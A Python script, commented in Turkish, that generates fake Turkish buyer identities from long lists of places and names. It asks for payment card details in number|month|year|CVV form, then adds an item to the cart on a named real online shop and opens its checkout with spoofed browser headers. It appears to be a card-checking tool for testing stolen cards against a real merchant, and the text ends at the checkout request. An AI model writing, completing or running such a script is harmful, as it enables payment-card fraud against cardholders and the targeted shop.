import requests
import json
import re
import time
import random
import unicodedata
turkiye = {
    "İSTANBUL": {
        "KADIKÖY": ["MODA", "FENERBAHÇE", "GÖZTEPE", "ACIBADEM", "KOZYATAĞI"],
        "BEŞİKTAŞ": ["LEVENT", "ORTAKÖY", "ETİLER", "AKARETLER", "NİŞANTAŞI"],
        "ŞİŞLİ": ["MECİDİYEKÖY", "OKMEYDANI", "HARBİYE", "GÜLBAHAR", "ESENTEPE"],
        "FATİH": ["SULTANAHMET", "EMİNÖNÜ", "BALAT", "FATİH", "SULTANESMA"],
        "BAKIRKÖY": ["ATAKÖY", "YEŞİLYURT", "FLORYA", "YEŞİLKÖY", "ZEYTİNLİK"],
        "ÜSKÜDAR": ["KISIKLI", "ÇENGELKÖY", "BEYLERBEYİ", "KANDİLLİ", "BULGURLU"],
        "MALTEPE": ["ALTINTEPE", "GÜLSÜYUYU", "BAŞİBÜYÜK", "FİGEN", "YALI"],
        "ATAŞEHİR": ["KÜÇÜKBAKKALKÖY", "İÇERENKÖY", "KAYIŞDAĞI", "ATA", "YENİSAHRA"],
        "BEYLİKDÜZÜ": ["KAVAKLI", "YAKUPLU", "GÜRPINAR", "BARIŞ", "ADNANKAHAVİ"],
        "PENDİK": ["KURTKÖYÜ", "RAMAZANOĞLU", "KAYNARCA", "VELİKOY", "DUMAN"]
    },
    "ANKARA": {
        "ÇANKAYA": ["KIZILAY", "BAHÇELİEVLER", "SİHİYİ", "GAZİOSMANPAŞA", "KAVAKLIDERE"],
        "KEÇİÖREN": ["ETLİK", "ESERTEPE", "AYDINLIKEVLER", "YENİMAHALLE", "UÇARSU"],
        "YENİMAHALLE": ["BATIKENT", "ŞENTEPE", "DEMETEVLER", "KARŞIYAKA", "İVEDİK"],
        "MAMAK": ["KUTLUDÜĞÜN", "DİKMEN", "LALAHAN", "GÜLVEREN", "SAKARYA"],
        "ETİMESGUT": ["BAĞLICA", "GÖKSU", "YAPRACIK", "ERYAMAN", "PİRİNCİ"],
        "SİNCAN": ["FATİH", "OSMANLICA", "TEMELLİ", "PİRİMEHMET", "ULUBAT"],
        "POLATLI": ["KARAAĞAÇ", "ŞEHİTLİK", "YENİDOĞAN", "BAŞKONAK", "CUMHURİYET"],
        "GÖLBAŞI": ["GÜDÜL", "KARACAALİ", "BEZİRHANE", "VADİ", "ŞAFAK"],
        "KAZAN": ["İMRAHOR", "AKINCI", "ÖRENÇİK", "SARAY", "CİMŞİT"],
        "PURAN": ["KARACALAR", "ORHANCİK", "YUKARIPINAR", "KARPUZLU", "AYDİN"]
    },
    "İZMİR": {
        "KONAK": ["ALSANCAK", "GÜZELYALI", "GÖZTEPE", "KARATAŞ", "PASAPORT"],
        "BORNOVA": ["KAZIMDİRİK", "EVKA1", "EVKA4", "PINARBAŞI", "SİTELER"],
        "KARŞIYAKA": ["ALAYBEY", "BOSTANLI", "NERGİZ", "SÖĞÜT", "ATATÜRK"],
        "BUCA": ["ŞİRİNYER", "KIRIKLAR", "EVKA1", "KAYNAKLAR", "ADATEPE"],
        "BAYRAKLI": ["ADALET", "MANAVKUYU", "SOĞUKKUYU", "MANSUR", "GÜMÜŞPALA"],
        "ÇEŞME": ["ALAÇATI", "İLICA", "PAŞALİMANI", "OVACIK", "DALYAN"],
        "KARABAĞLAR": ["YEŞİLYURT", "BAHARİYE", "YENİ", "KİBAR", "KURTULUŞ"],
        "BERGAMA": ["GAZİ", "İSLAMBEY", "ZEYTİNDAĞ", "AKROPOL", "HÜRRİYET"],
        "MENDERES": ["GÖLBEY", "TEKELİ", "ÖZDERE", "DEĞİRMENDERE", "CÜNEYT"],
        "TORBALI": ["AYRANCILAR", "ÇAYBAŞI", "HELİVECİ", "PAMUKYAZI", "SAĞLIK"]
    },
    "BURSA": {
        "NİLÜFER": ["ATAEVLER", "FETHİYE", "BEŞEVLER", "GÖRÜKLE", "ÜÇEVLER"],
        "OSMANGAZİ": ["HÜRRİYET", "HAMZABEY", "DEMİRTAŞ", "BAĞLARBAŞI", "EMEK"],
        "YILDIRIM": ["DAVUTKADI", "İNCİRLİ", "BARIŞMANAY", "YEŞİL", "MİMAR"],
        "GEMLİK": ["KÜÇÜKKUMLA", "BÜYÜKKUMLA", "UMURBEY", "ADLİYE", "HİLMİYE"],
        "MUDANYA": ["GÜZELYALI", "TRİLYE", "KUMYAKA", "ZEYTİNBAĞI", "MÜRSEL"],
        "İNEGÖL": ["OCAKBAŞI", "KILIÇKAYA", "TAHTAKÖPRÜ", "KAZIMKARABEKİR", "SÜLEYMAN"],
        "KESTEL": ["AHMET", "BARAKFAKİH", "VADİ", "YENİ", "CUMHURİYET"],
        "ORHANELİ": ["SELİMİYE", "ÇİVİ", "KÖYLER", "GÜRGÜR", "DERE"],
        "HARMANCIK": ["KİRAZLI", "GÜNEŞ", "BALLICA", "YEŞİL", "KAYA"],
        "BÜYÜKORHAN": ["DANİŞMENT", "KÜÇÜKORHAN", "AKTAŞ", "FATİH", "SELVİ"]
    },
    "ANTALYA": {
        "MURATPAŞA": ["KIZILTOPRAK", "GÜLLÜK", "VARSAK", "TOPÇULAR", "YENİGÜN"],
        "KONYAALTI": ["HURMA", "UNCALI", "LİMANAĞZI", "ALTINKUM", "YARIŞ"],
        "KEPEZ": ["KÜLTÜR", "ERENKÖY", "SÜTÇÜLER", "BARBAROS", "GAZİLER"],
        "AKSU": ["YEŞİLKARAMAN", "TOPALLI", "ÇALKAYA", "PERGE", "YURTPAŞA"],
        "MANAVGAT": ["SİDE", "KUMKÖY", "ILICA", "ÇOLAKLI", "TİTREYENĞÖL"],
        "ALANYA": ["MAHMUTLAR", "KESTEL", "TÜRKLER", "KARGICAK", "DİMLİ"],
        "SERİK": ["BELEK", "BOĞAZKENT", "KADRIYE", "ABDURRAHMAN", "BELKIS"],
        "KUMLUCA": ["MİLYAS", "KIRIŞ", "ADRASAN", "GÖLBAŞI", "KUM"],
        "KAŞ": ["KALKAN", "PATARA", "BEYKONAK", "GÖKÇEÖREN", "ÇAYAĞZI"],
        "DEMRE": ["ÇAYAĞZI", "BEYMELEK", "YAVUZ", "GÖKSU", "KALE"]
    },
    "ADANA": {
        "SEYHAN": ["KURUKÖPRÜ", "YEŞİLYURT", "KARAYUSUFLU", "GÜL", "BARBAROS"],
        "YÜREĞİR": ["KAYALIBAĞI", "ÇİÇEKLI", "BAHÇELİEVLER", "YAVUZLAR", "AKINCILAR"],
        "ÇUKUROVA": ["KURTKAPI", "KÜÇÜKDİKMEN", "KARŞIYAKA", "GÜZELYALI", "ESKİBEY"],
        "SARIÇAM": ["GÜLLER", "HÜSEYİNLI", "KARAÖMERLI", "MEHMETAĞA", "CİHANBEYLİ"],
        "KARAİSALI": ["KÖPRÜLÜ", "KIRIKLI", "SALBAŞ", "KIYASLI", "MERCİMEKLİ"]
    },
    "KONYA": {
        "SELÇUKLU": ["SİLLE", "KÖŞK", "MUSALLA", "KAYACI", "FERİTPAŞA"],
        "MERAM": ["ALAVERDİ", "KONUKLAR", "AYTAB", "GÖKÇE", "HASANŞEYH"],
        "KARATAY": ["AZİZİYE", "MÜMİNE", "ŞEMS", "İHSANİYE", "KIRKÇEŞME"],
        "EREĞLİ": ["SÜMER", "FATİH", "BAHÇELİEVLER", "KAYABAŞ", "ÇEŞMELİ"],
        "AKŞEHİR": ["YENİ", "KİLİSELİ", "ATATÜRK", "GÖLÇAYIR", "ALTUNKALE"]
    },
    "TRABZON": {
        "ORTAHİSAR": ["YENİCUMA", "KALEPARK", "GAZİPAŞA", "KUNDURA", "BEŞİRLİ"],
        "AKÇAABAT": ["DARICA", "SÖĞÜTLÜ", "MERSİN", "DOĞANCI", "SALACIK"],
        "ARAKLI": ["YEŞİLYURT", "YEŞİLKÖY", "KÖPRÜBAŞI", "TAŞKÖPRÜ", "KÜÇÜKDERE"],
        "VAKFIKEBİR": ["YALIKÖY", "ÇARŞI", "ESENTEPE", "KARLI", "YUKARIKÖY"],
        "MAÇKA": ["GALYAN", "YAZLIK", "EĞRİGÖL", "ATASU", "ŞİMŞİRLİ"]
    },
    "ERZURUM": {
        "YAKUTİYE": ["DADAŞKENT", "MURATPAŞA", "KÖŞK", "GÜLER", "KARAGÖZ"],
        "PALANDÖKEN": ["YILDIZ", "KARAYAZI", "GÜNEŞ", "ESENTEPE", "ÜNİVERSİTE"],
        "AZİZİYE": ["AĞZIAÇIK", "KÖŞK", "ÇİLLİGÖL", "TAHTALI", "KOP"],
        "HORASAN": ["HORASAN", "KARAKURT", "ARAS", "SUVEREN", "KARAÇOBAN"],
        "OLTU": ["SULAKSU", "GÜZELDERE", "TAŞLI", "KARAAĞAÇ", "BAĞBAŞI"]
    },
    "GAZİANTEP": {
        "ŞAHİNBEY": ["KARACA", "KARAGÖZ", "ŞEHİTKAMİL", "YAVUZELİ", "BEYMAHALLESİ"],
        "ŞEHİTKAMİL": ["BAĞLARBAŞI", "KARATAŞ", "YENİMAHALLE", "ÇIKSORUT", "TURAN"],
        "NİZİP": ["KOCAKENT", "CAMİKEBİR", "KAYACIK", "SELAHATTİN", "GÜLBAHAR"],
        "İSLAHİYE": ["AKBULUT", "KÖYLER", "CUMHURİYET", "YENİ", "KARAAĞAÇ"],
        "ARABAN": ["YEŞİLDERE", "KÖYLER", "KARABABA", "YUKARIYUFKA", "AŞAĞIYUFKA"]
    },
    "MERSİN": {
        "AKDENİZ": ["MERSİN", "CAMİLİ", "GÜMÜŞ", "KAVAKLI", "KIRKKAŞIK"],
        "TOROSLAR": ["MEZİTLİ", "YENİŞEHİR", "BARBAROS", "KIZILMURAT", "ÇAMLIBEL"],
        "YENİŞEHİR": ["CUMHURİYET", "ATATÜRK", "GÜNDOĞDU", "KOCAVELİLER", "FATİH"],
        "TARSUS": ["ESKİCAMİ", "KIRKKAŞIK", "CUMHURİYET", "YENİ", "ŞEHİTMUSTAFA"],
        "SİLİFKE": ["ATAYURT", "YEŞİLOVA", "KARABUCAK", "GÖKSU", "AKDENİZ"]
    },
    "DİYARBAKIR": {
        "SUR": ["SÜLEYMANİYE", "FATİHPAŞA", "MARDİNKAPI", "URFAKAPI", "YENİKAPI"],
        "BAĞLAR": ["KAYAPINAR", "BAĞLAR", "YENİŞEHİR", "SUR", "KONAK"],
        "KAYAPINAR": ["KOOPERATİFLER", "ŞEHİTLİK", "YENİKENT", "KÖŞKLER", "BELEDİYE"],
        "BİSMİL": ["TEKEL", "KÖPRÜBAŞI", "DİCLE", "YENİ", "KARASUNGUR"],
        "ÇERMİK": ["ÇERMİK", "KÖYLER", "YENİMAHALLE", "CUMHURİYET", "FATİH"]
    },
    "SAMSUN": {
        "İLKADIM": ["KALE", "BARUTHANE", "KURUPELİT", "ATAKUM", "YENİDOĞAN"],
        "ATAKUM": ["ATA", "KURUPELİT", "YENİDOĞAN", "ÇATALÇAM", "ALTINKUM"],
        "CANİK": ["HASKÖY", "DÜVECİK", "KÖPRÜBAŞI", "GÜLTEPE", "İMBATLI"],
        "TEKKEKÖY": ["TEKKEKÖY", "KÖYLER", "CUMHURİYET", "YENİ", "FATİH"],
        "BAFRA": ["GAZİ", "FATİH", "KIZILIĞ", "KÖPRÜBAŞI", "CUMHURİYET"]
    },
    "KAYSERİ": {
        "MELİKGAZİ": ["KÖŞK", "HUNAT", "GEVHER", "TACETTİN", "CAMİK"],
        "KOCASİNAN": ["ERKİLET", "MİMAR", "HİSARCIK", "CİRİT", "KUŞÇU"],
        "TALAS": ["TALAS", "ERCİYES", "ZİNCİDERE", "BAHÇELİEVLER", "YILDIZ"],
        "DEVELİ": ["DEVELİ", "SİNDELHÖYÜK", "GÖMEÇ", "AYVADAN", "KÖŞK"],
        "YAHYALI": ["YAHYALI", "KÖYLER", "CUMHURİYET", "YENİ", "FATİH"]
    },
    "ESKİŞEHİR": {
        "ODUNPAZARI": ["ŞARHÖYÜK", "MUTTALİP", "KURTULUŞ", "BÜYÜKDERE", "ÇANKAYA"],
        "TEPEBAŞI": ["BAHÇELİEVLER", "ESENTEPE", "HOŞNUDİYE", "İHSANİYE", "SÜTÇÜLER"],
        "SİVRİHİSAR": ["SİVRİHİSAR", "KÖYLER", "CUMHURİYET", "YENİ", "FATİH"],
        "ALPU": ["ALPU", "KÖYLER", "CUMHURİYET", "YENİ", "FATİH"],
        "MAHMUDİYE": ["MAHMUDİYE", "KÖYLER", "CUMHURİYET", "YENİ", "FATİH"]
    },
    "ŞANLIURFA": {
        "HALİLİYE": ["DİLEKLİ", "BAĞLARBAŞI", "SİTELER", "BAMYASUYU", "AKÇAKALE"],
        "EYYÜBİYE": ["AKÇAKALE", "KÜÇÜK", "BÜYÜK", "YENİ", "ESKİ"],
        "KARAKÖPRÜ": ["KARAKÖPRÜ", "KÖYLER", "CUMHURİYET", "YENİ", "FATİH"],
        "SİVEREK": ["SİVEREK", "KÖYLER", "CUMHURİYET", "YENİ", "FATİH"],
        "BİRECİK": ["BİRECİK", "KÖYLER", "CUMHURİYET", "YENİ", "FATİH"]
    },
    "MALATYA": {
        "BATTALGAZİ": ["FİRUZ", "GÜNDÜZBEY", "ÇAMLICA", "YILDIZ", "YEŞİLTEPE"],
        "YEŞİLYURT": ["GÜNDÜZBEY", "ÇAMLICA", "YILDIZ", "YEŞİLTEPE", "FİRUZ"],
        "DOĞANŞEHİR": ["DOĞANŞEHİR", "KÖYLER", "CUMHURİYET", "YENİ", "FATİH"],
        "AKÇADAĞ": ["AKÇADAĞ", "KÖYLER", "CUMHURİYET", "YENİ", "FATİH"],
        "DARENDE": ["DARENDE", "KÖYLER", "CUMHURİYET", "YENİ", "FATİH"]
    },
    "VAN": {
        "İPEKYOLU": ["EDREMİT", "ERİŞ", "HAYAT", "SİTELER", "CUMHURİYET"],
        "TUŞBA": ["TUŞBA", "KÖYLER", "CUMHURİYET", "YENİ", "FATİH"],
        "EDREMİT": ["EDREMİT", "KÖYLER", "CUMHURİYET", "YENİ", "FATİH"],
        "ERCİŞ": ["ERCİŞ", "KÖYLER", "CUMHURİYET", "YENİ", "FATİH"],
        "ÇATAK": ["ÇATAK", "KÖYLER", "CUMHURİYET", "YENİ", "FATİH"]
    },
    "DENİZLİ": {
        "PAMUKKALE": ["KAYA", "KERVANSARAY", "KARAHASANLI", "BAĞBAŞI", "KOCADERE"],
        "MERKEZEFENDİ": ["SEVİNDİK", "YENİŞEHİR", "HONAZ", "AKKÖY", "BULDAN"],
        "ÇİVRİL": ["ÇİVRİL", "KÖYLER", "CUMHURİYET", "YENİ", "FATİH"],
        "TAVAS": ["TAVAS", "KÖYLER", "CUMHURİYET", "YENİ", "FATİH"],
        "BULDAN": ["BULDAN", "KÖYLER", "CUMHURİYET", "YENİ", "FATİH"]
    },
    "SİVAS": {
        "MERKEZ": ["KALE", "BAHÇELİEVLER", "YILDIZ", "CUMHURİYET", "FATİH"],
        "ŞARKIŞLA": ["ŞARKIŞLA", "KÖYLER", "CUMHURİYET", "YENİ", "FATİH"],
        "YILDIZELİ": ["YILDIZELİ", "KÖYLER", "CUMHURİYET", "YENİ", "FATİH"],
        "SUŞEHRİ": ["SUŞEHRİ", "KÖYLER", "CUMHURİYET", "YENİ", "FATİH"],
        "GEMEREK": ["GEMEREK", "KÖYLER", "CUMHURİYET", "YENİ", "FATİH"]
    }
}
plaka_kodlari = {
    "İSTANBUL": "34",
    "ANKARA": "06",
    "İZMİR": "35",
    "BURSA": "16",
    "ANTALYA": "07",
    "ADANA": "01",
    "KONYA": "42",
    "TRABZON": "61",
    "ERZURUM": "25",
    "GAZİANTEP": "27",
    "MERSİN": "33",
    "DİYARBAKIR": "21",
    "SAMSUN": "55",
    "KAYSERİ": "38",
    "ESKİŞEHİR": "26",
    "ŞANLIURFA": "63",
    "MALATYA": "44",
    "VAN": "65",
    "DENİZLİ": "20",
    "SİVAS": "58"
}

isimler = [
    "Ahmet", "Ayşe", "Mehmet", "Zeynep", "Mert", "Elif", "Burak", "Nazlı",
    "Emre", "Selin", "Can", "Berkay", "Ece", "Yusuf", "Melis", "Barış",
    "Duru", "Kaan", "Ceyda", "Okan", "Aslı", "Beril", "Deniz", "Özge",
    "Alper", "Gizem", "İrem", "Hakan", "Cansu", "Tuna", "İlayda", "Kerem",
    "Sena", "Umut", "Sarp", "Buse", "Tolga", "Tuğçe", "Batuhan", "Damla", "Arda", "Neşe",
    "Onur", "Simay", "Melek", "Ömer", "Peri", "Rüzgar", "Bora", "Belinay", "Furkan", "Aleyna",
    "Çağrı", "Lara", "Eray", "Bade", "Samet", "İnci", "Yiğit", "Gül", "Orhan", "Esin",
    "Halil", "Dilara", "Eren", "Şevval", "Oğuz", "Tuana", "Eymen", "İdil", "Selçuk", "İnanç",
    "Uğur", "Yaren", "Enes", "Derya", "Taner", "Nehir", "Levent", "Beste", "Musa", "Naz",
    "Metin", "Bengisu", "Recep", "Yasemin", "Süleyman", "Sıla", "Ekrem", "Şule", "Bayram", "Zehra",
    "Cem", "Mina", "Veli", "Sibel", "Kadir", "Beyza", "Salih", "Zara", "İhsan", "Sevgi",
    "Talha", "Suna", "Vedat", "Sudenaz", "Cihan", "Serra", "Doğukan", "Alya", "Harun", "Sevda",
    "Kamil", "İpek", "Yılmaz", "Meryem", "Zeki", "Serpil", "İsmail", "Zümra", "Nevzat", "Tuğba",
    "Muhammed", "Hilal", "Orçun", "Hazal", "Tarık", "Eylül", "Ercan", "Meltem", "Sabri", "Asuman",
    "Mesut", "Nil", "Şahin", "Yelda", "Nihat", "Yasmin", "Ozan", "Burcu", "Nusret", "Şahika",
    "Serkan", "Yeliz", "İlker", "Büşra", "Yalçın", "İlknur", "Coşkun", "Feride", "Kutay", "Didem",
    "Cemil", "Arzu", "Refik", "Gülcan", "İrfan", "Leman", "Ziya", "Gonca", "Aykut", "Gözde",
    "Bedirhan", "Nisan", "Ferhat", "Hazal", "Taylan", "Şeyda", "Özcan", "Gülizar", "Kazım", "Asel",
    "Cavit", "Sare", "Koray", "Nisa", "Mahir", "Nergis", "Rahmi", "Açelya", "Yekta", "Derin",
    "Haluk", "Seren", "Rıdvan", "Müge", "Alpaslan", "Şimal", "Gökhan", "Zeliha", "Sezgin", "Bade",
    "Necati", "Esra", "Bayram", "Mislina", "Turgay", "Beren", "Yavuz", "Selma", "Oktay", "Yudum",
    "Burhan", "Medine", "Bekir", "Hülya", "Fikret", "Nur", "Tayfun", "Seçil", "Bülent", "Jale",
    "Fuat", "Vildan", "Nejat", "Kevser", "Adem", "Seher", "Tuncay", "Gülşah", "Latif", "Şirin",
    "Şemsettin", "Elvan", "Cüneyt", "İlknaz", "Faruk", "Nilgün", "Ramazan", "Efsun", "Gürkan", "Tülay",
    "Erhan", "Yasemin", "Tanju", "Yonca", "Tamer", "Şebnem", "Bahadır", "Nuray", "Polat", "Gaye",
    "Efe", "Sadiye", "Reşit", "Şule", "Münir", "Sibel", "Savaş", "Nazan", "İzzet", "Arzuhan",
    "Hüseyin", "Canan", "Nurettin", "Mevlüde", "Özgür", "Nuran", "Temel", "Zinet", "Yaşar", "Nilay",
    "Hakkı", "Necla", "Tuncer", "Nevin", "Celal", "Münire", "Rasim", "Şaziye", "Sami", "Nihal",
    "Kemal", "Arife", "Tuncel", "Remziye", "Sabahattin", "Hande", "Baki", "Serap", "Orhan", "Melek",
    "İlyas", "Zühre", "Hayati", "Şeyma", "Suat", "Sıdıka", "Halit", "Suna", "Muammer", "Fadime",
    "Yüksel", "Nuran", "Tevfik", "Emine", "Arif", "Adile", "Rauf", "Reyhan", "Mehmet Ali", "Sevim",
    "Emin", "Gülten", "Bahri", "Bedriye", "Şeref", "Naime", "Nail", "Sadiye", "Süreyya", "Seher",
    "Yücel", "Yeter", "İsmail", "Remziye", "Ömer Faruk", "Fatma", "Mahmut", "Zübeyde", "Zekeriya", "Şerife",
    "Abdullah", "Nadire", "Abdurrahman", "Emel", "Abbas", "Gülsüm", "Ali", "Pakize", "Ragıp", "Zeynep"
]

soyisimler = [
    "Yılmaz", "Demir", "Kaya", "Şahin", "Çelik", "Acar", "Özkan", "Duman",
    "Arslan", "Polat", "Koç", "Erdoğan", "Yıldız", "Türkmen", "Güven",
    "Karaca", "Bozkurt", "Öztürk", "Uslu", "Balcı", "Çetin", "Aydoğan",
    "Bayraktar", "Yüce", "Soylu", "Durmaz", "Taş", "Ersoy", "Korkmaz", "Aksoy","Albayrak", "Turan", "İnce", "Yalçın", "Erdem", "Keskin", "Uzun", "Doğan",
    "Avcı", "Yalçınkaya", "Altun", "Ergin", "Sezer", "Güler", "İpek", "Kurt",
    "Aslan", "Aydın", "Ateş", "Baran", "Özdemir", "Şimşek", "Yavuz", "Topal",
    "Bal", "Gökmen", "Bozkaya", "Köse", "Eren", "Yücel", "Kurtuluş", "Duru",
    "Er", "Bulut", "Yaman", "Sarıkaya", "Öz", "Yalman", "Boz", "Karagöz",
    "Kalkan", "Kaplan", "Alp", "Gümüş", "Altay", "Kurtaran", "Al", "Gök",
    "Durukan", "Kahraman", "Bayram", "Ayaz", "Yiğit", "Karahan", "Yıldırım",
    "Yörük", "Özçelik", "Saygın", "Erkan", "Akman", "Güleç", "Şener", "Tok",
    "Oğuz", "Kavak", "Özbek", "Demirtaş", "Kösemen", "Kocabey", "Erkal", "Bayrak",
    "Ergün", "Kılıç", "Göçmen", "Saruhan", "Sarı", "Koçoğlu", "Karaman", "Aytekin"
    "Yurdakul", "Başaran", "Tunç", "Tan", "Yardımcı", "Bilgin", "Sağlam", "Tuncel",
    "Türkmenoğlu", "Elmas", "Dalkılıç", "Yolcu", "Göktaş", "İlhan", "Fırat", "Işık",
    "Koçyiğit", "Göksel", "Tandoğan", "Meral", "Oral", "Köksal", "Gönül", "Gediz",
    "Önal", "Durak", "Çoban", "Sönmez", "Kalender", "Baş", "Karabulut", "Zengin",
    "Yolal", "Kutlu", "Yıldızhan", "Aydoğdu", "Altıntaş", "Taşdemir", "Zorlu", "Özer",
    "Gür", "Tetik", "Özaydın", "Bozdemir", "Barut", "Gürkan", "Kuzey", "Zaim", "Kavas",
    "Koca", "Ünal", "Dikmen", "Kara", "Kızıl", "Çakır", "Karasu", "Bozan", "Demiral",
    "Arı", "Gürsoy", "Yolaç", "Yurtsever", "Bozan", "Özmen", "Sağır", "Yalvaç", "Öztuna",
    "Gümüşsoy", "Gündüz", "Çakmak", "Çevik", "Gündoğdu", "Üstün", "Yıldıran", "Yurt",
    "Karakaya", "Yorgun", "Odabaş", "Başar", "Açıkalın", "Alkan", "Gözüpek", "Baydilli",
    "Maden", "Akıncı", "Özgür", "Akgül", "Bozok", "Ayan", "Özgen", "Çağlar", "Ece",
    "Ergül", "Erden", "Beyaz", "Karaağaç", "Karakurt", "Öner", "Gül", "Balcıoğlu",
    "Ulusoy", "Özkaya", "Yüksel", "Kavruk", "Delikan", "Çeviköz", "Karataş", "Gönültaş",
    "Keklik", "Atalay", "Altıok", "Uz", "Büyükkaya", "Kuş", "Türkoğlu", "Aksu",
    "Çakıl", "Arıkan", "Kavaklı", "Gökçen", "Tetikçi", "İnan", "Akbaş", "Tanrıkulu",
    "Akpınar", "Erim", "Kaptan", "Görkem", "İlter", "Özkanlı", "Aygün", "Akgün",
    "Başoğlu", "Göçer", "Güçlü", "Ermiş", "Yakut", "Şentürk", "Kınalı", "Demirkol",
    "Orhan", "İnanç", "Şahinöz", "Karabulut", "Sert", "Göçmenler", "Kılınç", "Gönülçelen",
    "Akyıldız", "Korkut", "Üstüner", "Ergeç", "Bozdoğan", "Kocaer", "Kut", "Serin",
    "Şimşekoğlu", "Çakıcı", "Kösedağ", "Yoldaş", "Ortakçı", "Bayındır", "Sağdıç", "Fidan",
    "Özkurt", "Karan", "Dağ", "Akçay", "Üçgün", "Kapukaya", "Bozkırlı", "Gökalp", "Taşçı",
    "Özbaş", "Soydan", "Özsever", "Dağlı", "Arıcı", "Mutlu", "Altuntaş", "Efeoğlu", "Temel",
    "Savaş", "Özkılıç", "Yakupoğlu", "Çalışkan", "Topçu", "Tetiktaş", "Kıran", "Aktaş",
    "Akkaş", "Kaptanoğlu", "Ertem", "Kula", "Temiz", "Yanar", "Eroğlu", "Doğru", "Gökay",
    "Görgülü", "Harman", "Karakurt", "Kaba", "Erginsoy", "Sevgi", "Sarıoğlu", "Batur", "Bayındır",
    "Ay", "Öztoprak", "Ülker", "Çınar", "Göral", "Bilge", "Demirtağ", "Kalkanlı", "Sertel",
    "Arısoy", "Kuyumcu", "Türkkan", "Akdoğan", "Keser", "Ekşi", "Özyurt", "Telli", "Tufan",
    "Akmeşe", "Ayhan", "Kocatepe", "Taşkın", "Türkmenli", "Savaşçı", "Alpdoğan", "Türkmenler",
    "Keleş", "Erboğa", "Güngör", "Gültekin", "Kahvecioğlu", "Keskinsoy", "Durmuş", "Sarıkayaoğlu",
    "Yakışıklı", "Yıldırımsoy", "Topaloğlu", "Özkayaoğlu", "Kutluer", "Yılmazer", "Büyüker",
    "Esen", "Altındal", "Gürbüz", "Deligöz", "Çağatay", "Taşdelen", "Bakır", "Alparslan",
    "Bora", "Zeybek", "Arslanbaş", "Saçan", "Çal", "Bekar", "Ortak", "Mutluer", "Soygür",
    "Tanış", "Yüceer", "Kelebek", "Özerk", "Karakuş", "Doğaner", "Yürek", "Ural", "Saygılı"
]
def temizle(metin):
    metin = metin.lower()
    cevir = str.maketrans("çğıöşü", "cgiosu")
    metin = metin.translate(cevir)
    metin = unicodedata.normalize('NFKD', metin).encode('ascii', 'ignore').decode('ascii')
    return re.sub(r'[^a-z0-9]', '', metin)
email_saglayicilar = ["gmail.com", "outlook.com", "yahoo.com", "hotmail.com", "protonmail.com"]
il = random.choice(list(turkiye.keys()))
ilce = random.choice(list(turkiye[il].keys()))
mahalle = random.choice(turkiye[il][ilce])
isim = random.choice(isimler)
soyisim = random.choice(soyisimler)
plaka = plaka_kodlari[il]
# Telefon numarası oluşturma
telefon = f"5{random.randint(30, 39)}{random.randint(100, 999)}{random.randint(1000, 9999)}"

# Email oluşturma
email = f"{temizle(isim)}.{temizle(soyisim)}{random.randint(10,99)}@{random.choice(email_saglayicilar)}"

# Adres ve posta kodu
adres = f"{mahalle} Mah., No: {random.randint(1, 100)}, {ilce}/{il}"
posta_kodu = f"{random.randint(30, 50)}{random.randint(100, 999)}"
# Kaydı oluştur
kayit = {
    "isim": isim,
    "soyisim": soyisim,
    "telefon": telefon,
    "email": email,
    "adres": adres,
    "posta_kodu": posta_kodu,
    "plaka": plaka  # Yeni eklenen alan
}
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; SM-S906N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0"
]
user_agent = random.choice(user_agents)
kart_bilgisi = input("Kart Bilgilerini gir: ")
start_time = time.time()
try:
    cardnumber, exp, year, cvv = kart_bilgisi.split('|')
    # Yılı 4 haneliyse 2 haneye çevir (yyyy -> yy)
    year = year[-2:] if len(year) == 4 else year
except:
    print("Hatalı format! Örnek format: 1234567890123456|06|25|123")
    exit()
mute = requests.Session()
guncel_zaman = time.strftime("%Y-%m-%d %H:%M:%S")
url = "https://www.hmswashing.com/shop/hms-original"

payload = {
    'attribute_select-size': '#0',
    'quantity': '1',
    'gtm4wp_product_data': '{"internal_id":8899,"item_id":"8899","item_name":"HMS Original","sku":"8899","price":12,"stocklevel":null,"stockstatus":"instock","google_business_vertical":"retail","item_category":"Stone","id":"8899"}',
    'add-to-cart': '8899',
    'product_id': '8899',
    'variation_id': '8902'
}

headers = {
    'User-Agent':user_agent,
    'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    'Content-Type': "application/x-www-form-urlencoded",
    'cache-control': "max-age=0",
    'sec-ch-ua': "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
    'sec-ch-ua-mobile': "?0",
    'sec-ch-ua-platform': "\"Android\"",
    'origin': "https://www.hmswashing.com",
    'upgrade-insecure-requests': "1",
    'sec-fetch-site': "same-origin",
    'sec-fetch-mode': "navigate",
    'sec-fetch-user': "?1",
    'sec-fetch-dest': "document",
    'referer': "https://www.hmswashing.com/shop/hms-original",
    'accept-language': "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
    'priority': "u=0, i",
}
response = mute.post(url, data=payload,headers=headers)
url = "https://www.hmswashing.com/checkout"
headers = {
  'User-Agent':user_agent,
  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  'sec-ch-ua': "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
  'sec-ch-ua-mobile': "?0",
  'sec-ch-ua-platform': "\"Android\"",
  'upgrade-insecure-requests': "1",
  'sec-fetch-site': "same-origin",
  'sec-fetch-mode': "navigate",
  'sec-fetch-user': "?1",
  'sec-fetch-dest': "document",
  'referer': "https://www.hmswashing.com/cart",
  'accept-language': "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
  'priority': "u=0, i",
}

response = mute.get(url, headers=headers)
